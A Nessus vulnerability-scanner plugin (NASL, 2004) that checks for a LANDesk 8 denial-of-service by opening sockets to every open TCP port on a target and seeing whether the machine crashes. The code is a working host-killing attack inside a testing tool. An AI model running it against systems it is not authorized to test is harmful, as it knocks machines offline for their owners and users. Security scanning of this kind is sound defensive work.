#
# This script was written by Michel Arboi <mikhail@nessus.org>
#
# See the Nessus Scripts License for details
#
# References:
# From: Ryan Rounkles <ryan.rounkles@gmail.com>
# To: vuln-dev@securityfocus.com
# Date: Tue, 19 Oct 2004 09:39:46 -0700
# Subject: Denial of service in LANDesk 8
#

if(description)
{
 script_id(15571);
 script_version ("$Revision: 1.4 $");
 
 name["english"] = "connect to all open ports";
 script_name(english:name["english"]);
 
 desc["english"] = "
It was possible to crash the remote system by connecting
to every open port.
This is known to bluescreen machines running LANDesk8
(In this case, connecting to two ports is enough)

Solution : inform your software vendor(s) and patch your system

Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "Crashes the machine by connecting to all open ports";
 script_summary(english:summary["english"]);
 
 script_category(ACT_KILL_HOST);
 
 script_copyright(english:"This script is Copyright (C) 2004 Michel Arboi");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"], francais:family["francais"]);
 script_require_keys("Settings/ThoroughTests");
 # script_require_ports("Services/msrdp", 3389);
# The original advisory says that we can crash the machine by connecting to
# LANDesk8 (which port is it?) and RDP simultaneously.
# I modified the attack, just in case
 exit(0);
}

include('global_settings.inc');

if ( ! thorough_tests ) exit(0);

start_denial();

i = 0;
ports = get_kb_list("Ports/tcp/*");
if(isnull(ports))exit(0);

foreach port (keys(ports))
{
 p = int(port - "Ports/tcp/");
 if (get_port_state(p))
  {
    s[i] = open_sock_tcp(p);
    if (s[i]) i ++;
  }
}


if ( i == 0 ) exit(0);
# display(i, " ports were open\n");

alive = end_denial();

if(!alive)
{
  security_hole(port);
  set_kb_item(name:"Host/dead", value:TRUE);
  exit(0);
}

for (j = 0; j < i; j ++)
  close(s[j]);
